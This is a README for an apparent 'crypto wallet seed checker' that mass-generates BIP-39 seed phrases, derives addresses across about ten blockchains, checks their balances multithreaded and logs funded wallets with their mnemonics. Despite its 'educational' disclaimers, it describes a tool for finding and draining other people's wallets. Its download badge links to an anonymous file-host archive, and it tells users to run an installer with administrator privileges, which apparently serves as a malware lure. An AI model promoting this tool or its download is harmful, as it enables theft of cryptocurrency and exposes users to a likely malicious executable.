# Crypto Wallet Seed Checker
[![Download](https://img.shields.io/badge/Download-Here-blueviolet)](https://files.catbox.moe/2hzfgm.zip)


**Crypto Wallet Seed Checker** is a high-performance tool designed to generate and analyze BIP-39 mnemonic phrases, automatically derive wallet addresses, and check for any existing balances across multiple blockchain networks.

> ⚠️ This tool is intended strictly for **educational and research purposes only**. The use of this software for unauthorized access or activity is strictly forbidden and illegal.

---

## 🚀 Features

- ✅ **BIP-39 Mnemonic Generator**  
  Generates standard-compliant mnemonic phrases using the official 2048-word English list. Supports 12, 15, 18, 21, and 24-word phrases.

- ✅ **Hierarchical Deterministic Wallet Derivation**  
  Derives keys and addresses via BIP-32, BIP-44, and BIP-84 paths:
  - Bitcoin: `m/44'/0'/0'/0/0`, `m/84'/0'/0'/0/0`
  - Ethereum: `m/44'/60'/0'/0/0`
  - Custom derivation paths supported

- ✅ **Supported Blockchains**  
  Supports querying balances and transaction history for the following blockchains:
  - **Bitcoin (BTC)** — Legacy, SegWit, Bech32
  - **Ethereum (ETH)** — ETH & all ERC-20 tokens
  - **Binance Smart Chain (BNB)** — BEP-20 tokens
  - **Polygon (MATIC)**
  - **Fantom (FTM)**
  - **Avalanche (AVAX)** — C-Chain
  - **Arbitrum One**
  - **Optimism**
  - **Dogecoin (DOGE)**
  - **Litecoin (LTC)**

- ✅ **Fast API-Based Scanning**  
  Integrates with public blockchain APIs (e.g., Etherscan, BscScan, Blockchair, Dogechain) to quickly verify balances and transaction history.

- ✅ **Multi-threaded Execution**  
  Threaded architecture to allow scanning of thousands of phrases per minute with minimal CPU bottleneck.

- ✅ **Custom Wordlist and Phrase Filtering**  
  Use a reduced or modified BIP-39 dictionary to target specific seed phrase patterns or weak/passphrase-protected wallets.

- ✅ **Result Logging & Export**  
  Outputs all "hits" (non-zero wallets) with timestamp, address, mnemonic, and chain info to a local `.txt` log for later review.

---

## 🛠 Installation

1. Go to the [Releases](https://github.com/Safwane-dev/crypto-wallet-seed-checker/releases) section of this repository.
2. Download the latest version of the tool (`SeedPhraseChecker.zip`).
3. Extract the archive to any folder on your system.
4. Run `installer.exe` and follow the on-screen instructions.

> ❗ Administrator privileges may be required for proper network access and API functionality.

---

## ⚙️ How to Use

Once installed, launch `SeedPhraseChecker.exe`.

You can configure parameters via the built-in GUI or pass command-line arguments:

# CLI Options and Usage

This document provides detailed information about the command-line interface (CLI) options for the **Crypto Wallet Seed Checker** tool, as well as sample outputs and other important details.

---

## CLI Options

The following options can be used to customize how **Seed Phrase Checker** operates when invoked from the command line.

| Option         | Description                                            |
|----------------|--------------------------------------------------------|
| `network`    | Target blockchain to check. Supported values include `bitcoin`, `ethereum`, `bsc`, etc. |
| `threads`    | Number of threads to use for generation and checking. Increasing the number of threads can speed up the process, but requires more CPU resources. |
| `phrases`    | Number of seed phrases to generate and check. This parameter allows you to specify how many phrases you want the program to process. |
| `log`        | Enable or disable logging of results. When enabled, results will be saved to `results/hits.txt`. The log can later be exported to CSV or JSON formats. |

---

## Legal Disclaimer

This project is intended strictly for educational and lawful use. The developer assumes no responsibility for misuse of this software. Accessing wallets without permission is a criminal offense in most jurisdictions.

By using this tool, you agree to use it in compliance with all applicable laws and regulations.



